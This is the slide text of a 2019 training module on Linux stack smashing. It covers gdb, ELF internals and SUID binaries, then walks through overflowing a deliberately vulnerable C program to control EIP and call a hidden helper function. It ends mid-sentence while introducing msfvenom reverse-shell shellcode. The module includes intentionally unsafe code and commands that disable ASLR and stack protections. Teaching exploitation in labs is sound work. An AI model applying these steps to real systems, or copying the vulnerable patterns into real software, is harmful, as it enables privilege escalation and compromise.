© Caendra Inc. 2019
All Rights Reserved
Linux Stack Smashing
S e c t i o n  0 1  |  M o d u l e  0 1
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Table of Contents
MODULE 01 | LINUX STACK SMASHING
1.1 Introduction to Linux Exploitation
1.2 Linux Stack Smashing
1.3 Abusing the EIP Control
|   p.2
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Learning Objectives
By the end of this module, you should have a better 
understanding of:
The basics of Linux binary internals
How to exploit simple buffer overflows on Linux-based 
systems
|   p.3
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
1.1
Introduction to 
Linux Exploitation
|  p.4
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
In order to approach Linux binary exploitation, we need to 
get to know the target. In order to do that, we need suitable 
tools. 
As information gathering is the most important part of 
every penetration testing activity, including binary 
exploitation, it is very important to know how to make use 
of tools that will help us recognize what is happening inside 
the target binaries.
|  p.5
1.1 Introduction to Linux Exploitation
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Contrary to Windows, where most applications are 
graphical interface-oriented, on Linux, and most of the tools 
used in Linux Exploitation, you will come across command 
line terminals.
Linux’s default debugger is gdb. It comes preinstalled with 
most Linux distributions; otherwise, it is accessible via:
sudo apt-get install gdb
|  p.6
1.1 Introduction to Linux Exploitation
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
In order to improve visibility of the gdb results, there are 
numerous plugins available on the web that were written by 
the community and shared publicly. Some of them are 
PEDA and pwndbg. For this course, we will use PEDA. 
PEDA can be easily downloaded and set up. The GitHub 
repository for it can be found at the following address:
https://github.com/longld/peda
|  p.7
1.1 Introduction to Linux Exploitation
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
There is nothing complicated in the installation 
instructions.
The ~/.gdbinit file contains commands that are to be 
executed at gdb startup. You can think of it as a .bashrc for 
gdb.
|  p.8
1.1 Introduction to Linux Exploitation
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
In order to debug a file using gdb, you can simply use the
command „gdb [file]”. Note that you will not be allowed to 
debug the suid binaries or attach to a more privileged 
process.
Once the program is loaded into the gdb, you can run it 
using the „run” command or „r”.
|  p.9
1.1 Introduction to Linux Exploitation
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
You are also allowed to specify command line arguments 
after the „run” command.
|  p.10
1.1 Introduction to Linux Exploitation
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
In addition, you can attach to an existing process with the
–p parameter, while –q (which is –quiet) is used so that
gdb does not print a lengthy version of initial information.
|  p.11
1.1 Introduction to Linux Exploitation
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Find below some additional and useful gdb commands:
• disas [function name] – Shows a disassembly of a 
function of certain name.
• break [function] or break *0xaddress – Puts a breakpoint 
at the entry of a function of certain name or at a certain 
address. Execution will stop each time a breakpoint is 
reached.
• print [name] – Displays contents of an object of certain 
name. The name could be a function name, register or 
variable.
|  p.12
1.1 Introduction to Linux Exploitation
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
• info [name] – Displays information about a certain name;
for example, info registers prints the contents of all 
registers.
• step – Step in the program until it reaches the next 
source line (Step Over).
• stepi – Step into exactly one instruction.
• x – examine. This command can be used to display 
various memory locations in various formats. The syntax 
for it is:
x/[number of units][data type] [location name]
|  p.13
1.1 Introduction to Linux Exploitation
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
For example, you can use:
•
x/20w $esi, which displays 20 words starting from where esi
points to.
OR
•
x/10i $eip, which displays 10 instructions starting from where 
eip points to.
You can find more gdb x command references at:
ftp://ftp.gnu.org/old-gnu/Manuals/gdb/html_chapter/gdb_9.html
|  p.14
1.1 Introduction to Linux Exploitation
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
It is worth mentioning that there are two common user 
Assembly syntax versions: AT&T and Intel. 
Gdb, by default, uses the AT&T syntax, which means the
assembly code is written differently. For example, a percent 
sign needs to precede any register, or the operands are 
written in reverse order as opposed to the Intel syntax, 
which could lead to confusions.
|  p.15
1.1 Introduction to Linux Exploitation
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
You can change the syntax handling manually by issuing 
the „set disassembly-flavor intel” command. PEDA does 
this by default, as you can see in its source code below.
|  p.16
1.1 Introduction to Linux Exploitation
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Other tools that are useful when inspecting Linux binaries 
are readelf, ltrace, strace and objdump. 
You may also like to use strings.
|  p.17
1.1 Introduction to Linux Exploitation
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
• ltrace and strace trace library or system calls performed 
by the target binary.
• readelf displays information about an ELF (Linux 
executable format) file. 
• objdump displays information about object files. It can 
also be used for disassembling Linux executables.
• strings extracts readable strings from a binary. This is 
useful for extracting hardcoded paths, „secret” strings or 
names.
|  p.18
1.1 Introduction to Linux Exploitation
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
ELF (Executable and Linking Format) is the Linux and unix 
executable file type. 
|  p.19
1.1.1 ELF Fundamentals
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
An ELF file consists of an ELF header and ELF data. It can 
be examined using the readelf command.
|  p.20
1.1.1 ELF Fundamentals
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
An ELF header contains important information for the OS 
on how to handle the file. Here are the most important 
parts of the header:
• It starts with the following hex sequence 7f 45 4c 46
• Class defines the target architecture
• Data refers to the type of endianness (little or big)
|  p.21
1.1.1 ELF Fundamentals
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Type can be CORE (core dumps), DYN (shared objects), 
EXEC (executables) or REL (relocatable files). 
Core dumps are products of memory corruption. They can 
be fed to gdb in order to examine crashed programs more 
accurately. We will use core dumps later on during exploit 
development.
|  p.22
1.1.1 ELF Fundamentals
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Before we move on to the remaining three types, we need 
to first understand what linkers and loaders are.
Linkers are responsible for taking the names of functions 
and linking them to their actual locations in memory. During 
a call to a function, the linker is responsible for locating its 
memory address within a system library and then writing it 
to the process memory of the executable, so that the 
function can be accessed at that address. The task of a
loader is to load programs from storage into memory.
|  p.23
1.1.1 ELF Fundamentals
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
If an executable requests to be loaded at a memory address that 
is already occupied, it needs to be relocated. Relocation simply 
means moving the module to another place in memory to avoid 
address collisions.
As this should be done in an organized manner, ELF files contain 
a .reloc section. Whenever the desired loading address is 
unavailable, the .reloc section is responsible for patching the 
program with new addresses. In order to be able to do that, 
relative addressing is used to describe the address of program 
functions.
|  p.24
1.1.1 ELF Fundamentals
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Relative addressing describes a function address by the 
offset from the loading base address and not by the full 
address. 
For example, if the relative virtual address of a function is 
0x123 and its program is loaded at 0x804000, the function 
can be found at 0x804123.
|  p.25
1.1.1 ELF Fundamentals
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Furthermore, executable files might also contain symbols.
Symbols are a description of the executable code and 
include, among others, function and variable names. 
During compilation, the creator of an executable may
decide to turn off support for symbols. 
|  p.26
1.1.1 ELF Fundamentals
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Symbols make debugging a lot easier since many function 
and variable names give a hint on what they are supposed 
to do; for example, finding functions named „getName()” or 
„printName()” can save us from a lot of reverse engineering 
activities.
The process of removing symbols from an ELF file is called 
stripping.
|  p.27
1.1.1 ELF Fundamentals
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
With some Linux executable handling concepts know 
explained, let’s go back to defining the remaining three ELF 
file types.
• EXEC (executables)
• REL (relocatable files)
• DYN (shared objects) 
|  p.28
1.1.1 ELF Fundamentals
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Executable files can be mapped directly into memory upon
execution.
|  p.29
1.1.1 ELF Fundamentals
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Relocatable files are executables supporting the relocation 
process. 
In cases of address conflict, they make use of relative 
addressing and change the address of their components 
with a constant offset to their dynamic base address.
|  p.30
1.1.1 ELF Fundamentals
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Shared Objects are libraries of functions. From a technical 
perspective, they contain sections typical for both
executable and relocatable files. They can be often 
recognized by their .so extension. 
Shared objects are loaded into a program that makes use 
of them during startup.
|  p.31
1.1.1 ELF Fundamentals
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Sections are some standard places within an ELF file that 
play a certain role in its functionalities. Upon startup, 
sections are mapped into the process memory. Mapping
means storing them in the memory of a newly created 
process with respect to their size and contained data.
Sections also have certain permissions – read, write and 
execute – none or all of them are theoretically possible to 
be enabled for a section. 
|  p.32
1.1.1 ELF Fundamentals
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
According to Permissions, while a program is running and 
data from a certain section should be used, operations on 
those areas may or may not be restricted.
For example, if a section (basically a memory area) is read-
only, the program will not be able to write new data to this 
area.
|  p.33
1.1.1 ELF Fundamentals
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
The most commons sections are:
.data – Initialized data with read/write access rights.
.rodata – Initialized data with read only access rights.
.bss – Uninitialized data with read and write access rights.
|  p.34
1.1.1 ELF Fundamentals
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
There are two sections that are very important for every 
executable: 
•
.GOT (Global Offset Table) holds the addresses of functions. 
•
.PLT (Procedure Linkage Table) holds the function stubs that 
point to the .GOT entry.
As you can imagine, both (first the PLT and then the GOT) are 
used while a program attempts to locate and call a certain 
function. Note that a place in the program where function 
addresses are held will become more than useful during exploit 
development.
|  p.35
1.1.1.1 GOT & PLT
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
To conclude the ELF files subject, let’s also cover SUID
files. SUID files are a type of ELF file that is quite interesting 
when it comes to exploitation on Linux and Unix.  
SUID and SGID files can be distinguished on Linux as they 
have a lowercase „s” in their 
security descriptor.
|  p.36
1.1.1.2 SUID & SGID
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
If a SUID (Set User IDentification) or SGID (Set Group 
IDentification) program is launched, its effective UID (or 
GID) becomes the owner of the file. 
• If you run a SUID root program, this program runs with 
root privileges.
• If you run a SGID program, the program runs with 
privileges as if you were member of that group.
|  p.37
1.1.1.2 SUID & SGID
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Even if you run a program as root, this doesn’t mean that 
you elevated your privileges. The actions you might take as 
root are limited by the program’s functionalities.
Also, as a program is running as root, you cannot attach 
gdb to it and change the execution flow manually, due to 
lack of privileges.
|  p.38
1.1.1.2 SUID & SGID
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
However, if there is an exploitable flaw within a SUID root 
program and you manage to spawn a shell via exploiting 
that flaw, there is high likelihood that that shell will be a
root one.
In other words, SUID programs when exploited can allow
for privilege escalation.
|  p.39
1.1.1.2 SUID & SGID
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
When performing post-exploitation activities on Linux 
systems, it is always worth paying attention to the SUID and 
SGID files, as they can often be primitive binaries prone to 
stack-based buffer overflow attacks.
We will complete our first exploit and try to execute it, later 
in this module.
|  p.40
1.1.1.2 SUID & SGID
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
1.2
Linux Stack 
Smashing
|  p.41
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Stack is an area of memory within a process that is used by 
the proces itself to save data. Contrary to registers which 
are small in size but the fastest among all temporary data 
storages, the stack offers a larger space. 
Stack is also used to track the execution of the program. 
|  p.42
1.2 Linux Stack Smashing
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
When a new function is called, in order to know in what 
place the execution stopped during the function call, the 
last address before the function call is stored on the stack.
This is called a return address, as this is where the program 
will return once a function is finished. 
|  p.43
1.2 Linux Stack Smashing
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
The stack is 4-byte aligned (32 bit).
The stack also grows towards lower addresses. This 
means, that if the first element that is pushed onto the 
stack has an address of 0xbffffff8, then it will occupy the 
space between 0xbffffff8 and 0xbffffff5. The next element 
pushed on the stack will start at 0xbffffff4.
1.2 Linux Stack Smashing
|  p.44
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
From a process perspective, if no advanced 
countermeasures are in place, the stack is just another
place in memory that can be operated on in the same way 
as all other addresses.
Stack overflow, also called buffer overflow or stack-based 
buffer overflow, occurs due to a programmatic error. This 
may happen when the program is insecurely handling user-
supplied data.
1.2 Linux Stack Smashing
|  p.45
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
When you write a program in languages like C or C++, you 
are required to declare the size of each variable you would 
like to use. This is because the program needs to reserve 
certain amounts of memory during runtime. 
Then, you can freely use your variable – for example, copy 
data from another place in memory to it. 
|  p.46
1.2 Linux Stack Smashing
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
However, you might want to store some user-supplied input 
into your declared variable. 
How are you sure that the user will not supply more data 
than you expected? What if that happens?
|  p.47
1.2 Linux Stack Smashing
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Let’s use an exemplary C program in order to simulate a 
stack overflow scenario. We will use Ubuntu 14, 32-bit 
version. 
If you would like to follow on your own system, you will be 
required to turn off some exploit countermeasures that 
exist on the OS by default. 
|  p.48
1.2 Linux Stack Smashing
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
For the time being, you do not need to bother with what 
those commands exactly do – it will be explained in detail 
later in the course. 
For now, you just need to know that we will disable NX and 
ASLR in order to be able to conduct basic exploitation of a 
stack overflow.
|  p.49
1.2 Linux Stack Smashing
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Compile: gcc -fno-stack-protector -z execstack program.c -o program
Disable ASLR: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space    
Before we compile any vulnerable code, let’s see what 
needs to be done to make the exploitation possible. If you 
reboot your machine during the exploitation, you will have 
to disable the ASLR after every reboot. Save the following
commands for later if you would like to follow along with 
the exercises.
|  p.50
1.2 Linux Stack Smashing
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
NOTE: The Hera Labs related to the entry modules of Linux 
exploitation have the necessary exploit countermeasures 
turned off, so you do not need to bother yourself with that 
while in the labs.
|  p.51
1.2 Linux Stack Smashing
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
#include <stdio.h>
#include <unistd.h>
int overflow() {
char buffer[500];
int userinput;
userinput = read(0, buffer, 500);
printf("\nUser provided %d bytes. Buffer content is: %s\n", userinput, buffer);
return 0;
}
int main(int argc, char *argv[]) {
overflow();
return 0;
}
Let’s consider the following source code:
|  p.52
1.2 Linux Stack Smashing
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
This program is secure. Let’s analyze it starting from the 
main() function downwards:
• It calls the overflow function.
• The overflow function declares a variable that is 500 
bytes wide.
• It “reads” 500 bytes from the user into this variable. Then, 
it confirms what happened by printing the provided 
buffer size and the buffer itself.
1.2 Linux Stack Smashing
|  p.53
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Let’s now think about the user’s input. 
What if we are allowed to write more than the declared 
variable’s size? 
1.2 Linux Stack Smashing
|  p.54
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
#include <stdio.h>
#include <unistd.h>
int overflow() {
char buffer[500];
int userinput;
userinput = read(0, buffer, 700);
printf("\nUser provided %d bytes. Buffer content is: %s\n", userinput, buffer);
return 0;
}
int main(int argc, char *argv[]) {
overflow();
return 0;
}
Let’s change the variable size:
|  p.55
1.2 Linux Stack Smashing
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Let’s compile the program according to the instructions:
|  p.56
1.2 Linux Stack Smashing
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
The program requires manual input of the characters. 
However, manually inserting hundreds of characters can be 
a tedious task. Luckily, we can interact with the program 
stdin using output redirection.
|  p.57
1.2 Linux Stack Smashing
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
We already know that the buffer variable has a size of 500 
bytes. Also, we are allowed to supply 700 bytes to it. Let’s 
take advantage of this fact. Let’s also increase the system 
core dump limit. 
Core dump is a type of ELF file that is created upon a 
segmentation fault (memory corruption) being encountered 
within a binary. Let’s issue the following command in the 
same terminal window where we run the vulnerable 
program: ulimit –c unlimited
|  p.58
1.2 Linux Stack Smashing
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Upon sending 700 „A”s to the binary, we notice that a crash 
has occured. 
|  p.59
1.2 Linux Stack Smashing
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Let’s examine it using gdb.
|  p.60
1.2 Linux Stack Smashing
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Due to supplying multiple „A”’s into the program buffer, they 
overflowed the stack and ended up in the EIP register. 
Let’s investigate in gdb how that happened.
|  p.61
1.2 Linux Stack Smashing
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
First, we open the program in gdb and disassemble the main 
function. We can see the call to the overflow() function. 
|  p.62
1.2 Linux Stack Smashing
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Then, let’s disassemble the 
overflow() function. 
We can see a few 
interesting points there.
|  p.63
1.2 Linux Stack Smashing
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
The buffer variable is pushed onto the stack before the call to 
read(). This is performed via moving the address of [ebp-0x200]
to the EAX (lea instruction), and then pushing it onto the stack as 
an argument to the read() function (push eax). The push 0x0 
right before the call is the second argument to read() and refers 
to the standard input. As those arguments are set up, read() is 
called, and will read from the user’s input to the memory location 
that is 0x200 bytes from the EBP.
We can put a breakpoint before and after the read() function. We 
will also need one more breakpoint at the last instruction of the 
function – return.
|  p.64
1.2 Linux Stack Smashing
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
The breakpoints are set in the following locations.
|  p.65
1.2 Linux Stack Smashing
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
We can now run the application. While within the debugger, 
we can still use output redirection from python, but we need 
to do it another way. We will save our target buffer in a file 
and then run the executable with “feeding” the „A”’s to it.
|  p.66
1.2 Linux Stack Smashing
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Immediately, the first breakpoint is hit. We can confirm 
where we are by examining the 5 instructions at the current 
eip, as follows.
|  p.67
1.2 Linux Stack Smashing
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
As our variable was in ebp-0x200, let’s get the address of it 
using the „p” command, and then examine some values 
that are currently there. 
|  p.68
1.2 Linux Stack Smashing
We see that nothing important resides there (no “A”s). 
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Let’s „continue” (or in short „c”) and see the second 
breakpoint being hit. If we examine the variable now, we 
see that the program successfully performed the read() 
operation and our „A”’s are now there.
|  p.69
1.2 Linux Stack Smashing
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Examining further, there are lots of „A”’s:
|  p.70
1.2 Linux Stack Smashing
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
As the „A”’s were copied onto the stack in a number larger 
than the declared variable size, obviously they needed to be 
placed somewhere. The normal behavior of a program is 
that they are copied further down the stack, overflowing 
other data that was meant to reside there.
|  p.71
1.2 Linux Stack Smashing
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
One piece of data that was overwritten on the stack was 
the return address. Once the overflow() function is 
complete, the return address that was pushed onto the 
stack is meant to be picked up to restore the rest of the
main() function. However…
|  p.72
1.2 Linux Stack Smashing
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
As we „continue” once again, we hit the last breakpoint set up at the return instruction. The return instruction 
takes the data at the top of the stack and puts it in the EIP. 
Originally, the saved return adress (so the address of the instruction right after the call to overflow()) would be 
restored. But, as the unexpectedly long input was saved into the memory by the attacker, that location was 
overwritten (and some space after it too!) so we have just AAAA (hex 0x41414141) there. 
The program is not aware of this fact and tries to pick up the return address that is supposed to be on the top 
of the stack. On the screenshot you can see that actually the data on top of the stack was overwritten.
The program is trying to restore the execution flow at 0x41414141. Such location does not exist within the
process memory and the program encounters a segmentation fault.
|  p.73
1.2 Linux Stack Smashing
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
As we now step an instruction forward, the segmentation 
fault occurs, as 0x41414141 is put into EIP. This is not a 
valid memory location, so the program crashes.
|  p.74
1.2 Linux Stack Smashing
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
By supplying enough lenghty data to the program, we were 
able to influence the value of the EIP, thus the address of 
the code to be executed. 
If we were able to replace 0x41414141 with a real address, 
the program would start executing code that resides in that 
place.
|  p.75
1.2 Linux Stack Smashing
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
We would like to know the exact length of the buffer that is 
required to start overflowing the saved return address. We 
would then be able to precisely overwrite the EIP with our 
controlled data. There are various methods to calculate the 
offset from the beginning of the buffer to the EIP. 
There are the pattern_create.rb and pattern_offset.rb tools
shipped with metasploit. Also, pattern create is one of the 
PEDA utilities. They both work in the same say – creating a 
pattern of a unique string of a given length. 
|  p.76
1.2 Linux Stack Smashing
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
During the crash, EIP is overwritten with some bytes 
belonging to this string. 
Since it is unique and based on the numeric value of the
EIP, it is possible to identify at what place of the string the 
EIP was overwritten.
|  p.77
1.2 Linux Stack Smashing
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
We can instantly save the pattern to a file and feed it to the 
executable, as follows.
|  p.78
1.2 Linux Stack Smashing
Based on the EIP value, it is also possible to identify the 
correct offset to the EIP.
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Let’s use this value to construct a new payload and run the 
executable with it (we are essentially trying to fill the EIP 
with “B”s):
|  p.79
1.2 Linux Stack Smashing
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Our calculations were correct. The EIP was overwritten with 
the „B”’s. We can thus control the execution flow of the 
program.
|  p.80
1.2 Linux Stack Smashing
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
You’ve been studying quite 
intently. We recommend taking 
a quick break and come back 
refreshed. 
|  p.81
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
1.3
Abusing the EIP 
Control
|  p.82
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
We have proven that by supplying an input of a certain 
length to the binary, it is possible to make its EIP register 
point to a certain address. 
So far, we have used invalid addresses consisting of an 
ASCII byte representation of the letters A or B. How about 
using a valid address?
|  p.83
1.3 Abusing the EIP Control
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
#include <stdio.h>
#include <unistd.h>
int helper() {
system("touch pwnd.txt");
}
int overflow() {
char buffer[500];
int userinput;
userinput = read(0, buffer, 700);
printf("\nUser provided %d bytes. Buffer content is: %s\n", userinput, buffer);
return 0;
}
int main (int argc, char * argv[]) {
overflow();
return 0;
}
Let’s compile a very similar program:
|  p.84
1.3.1 Code Reuse Through EIP Control
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
The only difference between this and the previous program 
is a function that is not used. 
A piece of code within a program that is not used, which 
may happen, e.g., due to a developer’s error of not removing 
unused functions, is called dead code. 
|  p.85
1.3.1 Code Reuse Through EIP Control
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Compile: gcc -fno-stack-protector -z execstack program.c -o program
Disable ASLR: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space    
As a reminder, here are the compilation commands that
you may find helpful. 
|  p.86
1.3.1 Code Reuse Through EIP Control
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
One of the first things we can do with the EIP control, is
reuse the dead code within the binary. 
In other words, we will make the EIP point to the function 
helper() so it is executed. 
|  p.87
1.3.1 Code Reuse Through EIP Control
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
In order to do that, we need to know the address of this 
function. 
Let’s run the newly created binary in gdb and check the 
address of the function using the „p helper” command.
|  p.88
1.3.1 Code Reuse Through EIP Control
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
If you do not have the source code of the target program, 
and the binary is not stripped, you can try to locate the 
existing functions using gdb’s „info functions” command.
|  p.89
1.3.1 Code Reuse Through EIP Control
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Even if you do not know the 
source code, it is possible to 
find and disassemble the
„helper” function.
|  p.90
1.3.1 Code Reuse Through EIP Control
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
The disassembly dump
clearly shows the call 
to system() and the 
push of an address to 
the stack right before 
it. 
|  p.91
1.3.1 Code Reuse Through EIP Control
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
It can be easily guessed that something that is pushed onto 
the stack right before the function call is its argument.
By examining one string at that address, we can now be 
sure this is an argument to the system() function which 
makes it create a file.
|  p.92
1.3.1 Code Reuse Through EIP Control
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Now we need to create the buffer to be fed to the program 
that contains the address of the helper() function instead of 
ASCII letters. We need to remember that:
• Bytes in memory are stored in reverse order, so we need 
to split the address into separate bytes and write it from
the end to the beginning.
• Using escape sequences, we can store those bytes in the 
buffer.
|  p.93
1.3.1 Code Reuse Through EIP Control
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
NOTE: if you try to replicate the exercise on your own 
machine, the address of the function may vary from what is 
shown in the slides.
|  p.94
1.3.1 Code Reuse Through EIP Control
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
As examined with gdb, the address of the helper function is 
0x804846b. 
As a hexadecimal address is 4 bytes long, we obviously 
lack one digit here; this is because the trailing zero was 
skipped. The adress in its 8-byte form would be 
0x0804846b.
|  p.95
1.3.1 Code Reuse Through EIP Control
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
As we split it into bytes, we receive:
0x 08 04 84 6b
In order to meet the requirements of the memory storage 
format, we need to send them to the buffer in reverse order:
6b 84 04 08
|  p.96
1.3.1 Code Reuse Through EIP Control
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Let’s replace „BBBB” with the address of the helper() 
function.
|  p.97
1.3.1 Code Reuse Through EIP Control
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Now, let’s run the executable within gdb and feed the input 
to it. We can observe that a new process was created.
|  p.98
1.3.1 Code Reuse Through EIP Control
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
The helper function was executed and a new file was 
created as per the purpose of the helper() function. 
|  p.99
1.3.1 Code Reuse Through EIP Control
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
*Labs are only available in Full or Elite Editions of the course. To access, go to the course in your members area and 
click the labs drop-down in the appropriate module line or to the virtual labs tabs on the left navigation. To 
upgrade, click LINK. 
In this lab, you will practice 
identifying and exploiting a 
Linux stack overflow 
vulnerability in a binary. You 
will also learn how to find 
reusable code within the binary 
to facilitate exploitation.
Hidden Function Lab
|  p.100
Hera Lab #1
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
It is obvious that there will not be a function in every binary
that can be called in order to execute a usable action.
Let’s now try to exploit the buffer overflow by adding the 
final part – the shellcode.
|  p.101
1.3.2 Shellcode Fundamentals
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Shellcode is a set of instructions that is used to execute 
certain actions within the program. 
As we are most often interested in getting a shell – it’s 
called shellcode.
|  p.102
1.3.2 Shellcode Fundamentals
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
If you disassemble a single executable, you will note that it 
consists of various bytes. 
Each byte can be translated to a certain instruction 
(procesor operation). 
|  p.103
1.3.2 Shellcode Fundamentals
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
If you point the current execution flow (EIP register) into an 
area of memory and if this area is granted an execute 
permission (for example - it is an executable section), the 
program will try to execute the bytes that reside there 
regardless if they were meant to be data or instructions.
|  p.104
1.3.2 Shellcode Fundamentals
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
You can think of shellcode as a compiled assembly 
program in the form of raw machine code.
Writing shellcode will be discussed in a later section, as 
some constraints exist. In addition, you simply cannot input 
any bytes of assembly into memory. For example, there are 
some specific bytes that might break an exploit. Mastering 
shellcoding is also about being able to use specific 
characters while staying away from using other ones.
|  p.105
1.3.2 Shellcode Fundamentals
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
For the time being, we can generate our own shellcode 
without knowing how its internals work by using msfvenom,
which is a part of the metasploit framework.
The last thing we need to do is answer the following 
question. How can the shellcode be delivered into the 
program?
|  p.106
1.3.2 Shellcode Fundamentals
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
As we are overflowing the buffer with a large portion of 
data, it becomes part of the application memory. The 
shellcode can be shipped in there, as once the buffer is 
delivered to the application, it will be possible to locate it 
within memory.
There’s also one additional matter - bad characters. Since a
buffer overflow is caused in most cases by an insecure 
copy / read or similar operation, you should be aware of 
how such functions handle user input.
|  p.107
1.3.2 Shellcode Fundamentals
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
If you ever try to decompile such a function, for example 
strcpy(), you will notice that it scans the user’s string and 
compares each character’s byte representation to zero (null 
byte, 0x00).
Once a null byte is reached, it stops copying as it knows 
that the end of the string was reached.
|  p.108
1.3.2 Shellcode Fundamentals
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Additionally, if you take a look at the C/C++ strings at the
byte level, you will notice that there is a 0x00 byte at the 
end of each of them. You also might often encounter the
term „null-terminated string”, which refers to the C-style 
strings with a zero on their end.
Since we would like to insert a shellcode into the exploit 
buffer, we need to avoid any null bytes in it. This time it will 
be generated automatically, as it is just a matter of adding 
one parameter to msfvenom.
|  p.109
1.3.2 Shellcode Fundamentals
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
However you should be aware that different functions and 
programs might have different bad characters, not only the
null byte. 
Even if this is not the case now, be aware for future 
exploitation attempts.
|  p.110
1.3.2 Shellcode Fundamentals
XDSv1: Section 1, Module 1 - Caendra Inc. © 2019
Let’s generate the shellcode in order to insert it into the 
exploit buffer. We will use a reverse shell shellcode. It will 
require a netcat listener to establish a reverse shell 
connection to it. „-b” is used to specify the characters that 
